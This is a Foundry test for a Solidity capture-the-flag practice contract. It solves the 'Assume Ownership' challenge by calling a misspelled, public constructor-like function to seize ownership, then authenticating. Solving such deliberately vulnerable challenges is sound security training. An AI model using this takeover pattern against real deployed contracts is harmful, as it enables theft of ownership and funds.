// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;
import "forge-std/Test.sol";
import "src/AssumeOwnership.sol";

contract AssumeOwnershipTest is Test {
    AssumeOwnershipChallenge private assumeownership;
    address private constant ALICE = address(0x1);
    function setUp() external {
        vm.deal(ALICE, 1e18);
        vm.startPrank(ALICE);
        assumeownership = new AssumeOwnershipChallenge();
    }
    
    function testHack() external {
        assumeownership.AssumeOwmershipChallenge();
        assumeownership.authenticate();

        assertEq(assumeownership.isComplete(), true);
    }
}